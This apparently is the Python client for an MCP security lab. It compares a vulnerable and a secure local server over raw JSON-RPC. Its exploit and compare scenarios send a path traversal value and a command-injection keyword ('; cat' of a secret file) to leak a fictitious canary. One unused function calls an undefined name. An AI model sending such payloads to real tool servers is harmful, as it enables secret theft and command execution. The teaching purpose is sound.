"""Minimal MCP client for lab01, with NO SDK and NO LLM.

Speaks JSON-RPC 2.0 directly to the server over stdio (one JSON message per
line) so you can see exactly what travels over the wire.

Scenarios:
  handshake  Lifecycle: initialize -> initialized -> tools/list -> tools/call
  exploit    Sends path traversal and command injection payloads
  interactive REPL over the wire
  compare    side-by-side vulnerable vs secure

Target server (config): MCP_SERVER environment variable = vulnerable | secure
  .env is the source of truth; the default below is only a safety net for
  running outside Docker.
"""
import argparse
import json
import os
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

LAB_DIR = Path(__file__).resolve().parent.parent
LOG_DIR = LAB_DIR / "logs"
SERVERS = {"vulnerable": "src/server.py", "secure": "src/server_secure.py"}
DEFAULT_SERVER = "vulnerable"  # documented fallback: only used outside Docker
CANARY = "FLAG{mcp-lab01-fictitious-secret}"
PROTOCOL_VERSION = "2025-06-18"

# Terminal color codes (ANSI); used when stdout is a TTY. --no-color disables them.
_COLOR = {
    "green": "\033[32m",
    "red": "\033[31m",
    "reset": "\033[0m",
    "yellow": "\033[33m",
}

# Detect TTY at import time; fall back to no color on Windows consoles and pipes.
try:
    _TTY = sys.stdout.isatty()
except Exception:
    _TTY = False

if _TTY:
    GREEN = _COLOR["green"]
    RED = _COLOR["red"]
    YELLOW = _COLOR["yellow"]
    RESET = _COLOR["reset"]
else:
    GREEN = RED = YELLOW = RESET = ""


class Wire:
    """Sends and receives JSON-RPC messages, prints them and logs them to .jsonl."""

    def __init__(self, proc: subprocess.Popen, log_path: Path):
        self.proc = proc
        self.log = log_path.open("a", encoding="utf-8")
        self._next_id = 0

    def _record(self, direction: str, message: dict) -> None:
        arrow = "-->" if direction == "client->server" else "<--"
        print(f"\n{arrow} {direction}")
        print(json.dumps(message, indent=2, ensure_ascii=False))
        entry = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "direction": direction,
            "message": message,
        }
        self.log.write(json.dumps(entry, ensure_ascii=False) + "\n")
        self.log.flush()

    def event(self, name: str, **data) -> None:
        entry = {"ts": datetime.now(timezone.utc).isoformat(), "event": name, **data}
        self.log.write(json.dumps(entry, ensure_ascii=False) + "\n")
        self.log.flush()

    def notify(self, method: str, params: dict | None = None) -> None:
        msg = {"jsonrpc": "2.0", "method": method}
        if params is not None:
            msg["params"] = params
        self._send(msg)

    def request(self, method: str, params: dict | None = None) -> dict:
        self._next_id += 1
        msg = {"jsonrpc": "2.0", "id": self._next_id, "method": method}
        if params is not None:
            msg["params"] = params
        self._send(msg)
        while True:  # skip interleaved notifications until the reply with our id arrives
            reply = self._recv()
            if reply.get("id") == self._next_id:
                return reply

    def _send(self, msg: dict) -> None:
        self._record("client->server", msg)
        self.proc.stdin.write(json.dumps(msg) + "\n")
        self.proc.stdin.flush()

    def _recv(self) -> dict:
        line = self.proc.stdout.readline()
        if not line:
            raise RuntimeError("The server closed the connection (use --server-stderr to see its error)")
        msg = json.loads(line)
        self._record("server->client", msg)
        return msg

    def close(self) -> None:
        self.log.close()


def result_text(reply: dict) -> tuple[bool, str]:
    """Return (is_error, text) for a tools/call reply."""
    if "error" in reply:  # JSON-RPC protocol-level error
        return True, json.dumps(reply["error"], ensure_ascii=False)
    result = reply["result"]
    text = "\n".join(c.get("text", "") for c in result.get("content", []))
    return bool(result.get("isError")), text


def initialize(wire: Wire) -> None:
    wire.request(
        "initialize",
        {
            "protocolVersion": PROTOCOL_VERSION,
            "capabilities": {},
            "clientInfo": {"name": "lab01-raw-client", "version": "0.1.0"},
        },
    )


def _fmt_verdict(text: str) -> str:
    """Return text wrapped with ANSI color codes when running in a TTY."""
    t = text.strip().upper()
    if "EXPLOITED" in t:
        return f"{GREEN}[EXPLOITED]{RESET}"
    if "BLOCKED" in t:
        return f"{RED}[BLOCKED]{RESET}"
    return f"{YELLOW}{t}{RESET}"


def exploit(wire: Wire, server_name: str) -> None:
    """Run exploit payloads against the server. Prints each verdict inline."""
    # The lifecycle is mandatory before calling any tool, but we don't print its explanation here.
    initialize(wire)
    wire.notify("notifications/initialized")

    secret_path = LAB_DIR / "data" / "secret.txt"
    attacks = [
        ("Path traversal (CWE-22)", "read_note", {"name": "../secret.txt"}),
        (
            "Command injection (CWE-78)",
            "search_notes",
            # '/dev/null' keeps grep from waiting on stdin; '#' comments out the rest of the line.
            {"keyword": f"zzz /dev/null; cat {secret_path} #"},
        ),
    ]
    verdicts = []
    for title, tool, args in attacks:
        print(f"\n=== ATTACK: {title} ===")
        reply = wire.request("tools/call", {"name": tool, "arguments": args})
        is_error, text = result_text(reply)
        leaked = CANARY in text
        verdict = "EXPLOITED" if leaked else "BLOCKED"
        wire.event("verdict", attack=title, tool=tool, arguments=args, server=server_name,
                   leaked=leaked, is_error=is_error)
        verdicts.append((title, verdict))
    print(f"\n=== SUMMARY (server: {server_name}) ===")
    for title, verdict in verdicts:
        print(f"  {_fmt_verdict(verdict)} {title}")


def run_scenario_handshake(wire: Wire) -> None:
    """Run the handshake lifecycle."""
    print("\n=== 1. initialize: client and server negotiate version and capabilities ===")
    handshake(wire)
    # Actually, handshake() below does the work; reusing the name.
    # We'll call the logic directly.


def handshake_full(wire: Wire) -> None:
    """Run the handshake lifecycle: initialize + initialized + tools/list + tools/call."""
    print("\n=== 1. initialize: client and server negotiate version and capabilities ===")
    initialize(wire)
    print("\n=== 2. notifications/initialized: the client confirms (no reply, it carries no id) ===")
    wire.notify("notifications/initialized")
    print("\n=== 3. tools/list: the server describes its tools (this is what an LLM reads) ===")
    wire.request("tools/list")
    print("\n=== 4. tools/call: legitimate use of a tool ===")
    wire.request("tools/call", {"name": "list_notes", "arguments": {}})
    wire.request("tools/call", {"name": "read_note", "arguments": {"name": "welcome.md"}})


def run_scenario_exploit(args, proc, wire, server_name, show_secret) -> None:
    """Run exploit payloads and optionally show canary summary."""
    print(f"\n=== EXPLOIT SCENARIO (server: {server_name}) ===")
    exploit(wire, server_name)
    if show_secret:
        # Re-emit canary status — the exploit already printed a summary,
        # but we add a one-liner with the raw CANARY string.
        print(f"\nCanary: {CANARY}")


def run_scenario_interactive(args, proc, wire) -> None:
    """Interactive REPL: user picks tool + args, sees raw JSON-RPC round-trip."""
    print("\n=== INTERACTIVE MODE ===")
    initialize(wire)
    wire.notify("notifications/initialized")

    # List available tools once so the user knows the options
    reply = wire.request("tools/list")
    tools = {t["name"]: t for t in reply["result"]["tools"]}
    print(f"Available tools: {', '.join(sorted(tools))}")
    print("Enter:  <tool_name> <json-args>  (e.g. read_note {\"name\": \"welcome.md\"})")
    print("Blank line to exit. Ctrl-C to abort.")
    while True:
        try:
            line = input("mcp> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            break
        parts = line.split(maxsplit=1)
        tool_name = parts[0]
        if tool_name not in tools:
            print(f"Unknown tool: {tool_name}. Available: {', '.join(sorted(tools))}")
            continue
        args_json = parts[1] if len(parts) > 1 else "{}"
        try:
            args = json.loads(args_json)
        except json.JSONDecodeError as e:
            print(f"Invalid JSON: {e}")
            continue
        reply = wire.request("tools/call", {"name": tool_name, "arguments": args})
        _is_error, text = result_text(reply)
        print(text)


def compare_servers(servers: list[tuple[str, str]], attacks: list[tuple[str, str, dict]], main_log: Path) -> list[dict]:
    """Run the same payload set against multiple servers; return per-server verdicts.

    Each entry in ``servers`` is a (server_name, server_script) pair so this works
    with the vulnerable and secure variants without depending on the env var.
    All traffic is appended to ``main_log`` with a ``server`` field so the
    comparison is a single trace.
    """
    results: list[dict] = []
    main = main_log.open("a", encoding="utf-8")
    try:
        for server_name, script in servers:
            proc = subprocess.Popen(
                [sys.executable, str(LAB_DIR / script)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                bufsize=1,
            )
            wire = Wire(proc, main_log)
            try:
                initialize(wire)
                wire.notify("notifications/initialized")
                verdicts = []
                for title, tool, args in attacks:
                    reply = wire.request("tools/call", {"name": tool, "arguments": args})
                    _is_error, text = result_text(reply)
                    leaked = CANARY in text
                    verdicts.append((title, "EXPLOITED" if leaked else "BLOCKED", leaked))
                results.append({"server": server_name, "verdicts": verdicts})
            finally:
                wire.close()
                proc.stdin.close()
                proc.terminate()
                proc.wait(timeout=5)
    finally:
        main.close()
    return results


def run_scenario_compare(args, proc, wire, log_path) -> None:
    """Run exploit against both servers, print side-by-side table."""
    print(f"\n=== COMPARISON: vulnerable vs secure ===")
    attacks = [
        ("Path traversal (CWE-22)", "read_note", {"name": "../secret.txt"}),
        ("Command injection (CWE-78)", "search_notes", {"keyword": f"zzz /dev/null; cat {LAB_DIR / 'data' / 'secret.txt'} #"}),
    ]
    servers = [
        ("vulnerable", "src/server.py"),
        ("secure", "src/server_secure.py"),
    ]
    results = compare_servers(servers, attacks, log_path)

    # Print table header
    print(f"\n{'Attack':<35} {'vulnerable':<15} {'secure':<15}")
    print("-" * 65)
    for i, (title, _, _) in enumerate(attacks):
        v_verdict = results[0]["verdicts"][i][1]
        s_verdict = results[1]["verdicts"][i][1]
        print(f"{title:<35} {_fmt_verdict(v_verdict):<25} {_fmt_verdict(s_verdict):<25}")

    if args.show_secret:
        leaked_v = any(v[2] for v in results[0]["verdicts"])
        leaked_s = any(v[2] for v in results[1]["verdicts"])
        print(f"\nCanary: {CANARY}")
        print(f"  vulnerable: {'LEAKED' if leaked_v else 'SAFE'}")
        print(f"  secure:     {'LEAKED' if leaked_s else 'SAFE'}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--scenario", choices=["handshake", "exploit", "interactive", "compare", "compare-show"], default="handshake")
    parser.add_argument("--server-stderr", action="store_true", help="show the server's stderr")
    parser.add_argument("--show-secret", action="store_true", help="print canary-leak summary after exploit/compare")
    args = parser.parse_args()

    server_name = os.environ.get("MCP_SERVER", DEFAULT_SERVER)
    if server_name not in SERVERS:
        print(f"MCP_SERVER must be one of {list(SERVERS)}, not '{server_name}'", file=sys.stderr)
        return 2

    LOG_DIR.mkdir(exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    log_path = LOG_DIR / f"lab01-{args.scenario}-{server_name}-{stamp}.jsonl"

    print(f"Server: {server_name} ({SERVERS[server_name]}) | scenario: {args.scenario}")
    proc = subprocess.Popen(
        [sys.executable, str(LAB_DIR / SERVERS[server_name])],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=None if args.server_stderr else subprocess.DEVNULL,
        text=True,
        bufsize=1,
    )
    wire = Wire(proc, log_path)
    try:
        if args.scenario == "handshake":
            handshake_full(wire)
        elif args.scenario == "exploit":
            run_scenario_exploit(args, proc, wire, server_name, args.show_secret)
        elif args.scenario == "interactive":
            run_scenario_interactive(args, proc, wire)
        elif args.scenario in ("compare", "compare-show"):
            run_scenario_compare(args, proc, wire, log_path)
    finally:
        wire.close()
        proc.stdin.close()
        proc.terminate()
        proc.wait(timeout=5)
    print(f"\nJSONL log: {log_path.relative_to(LAB_DIR)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())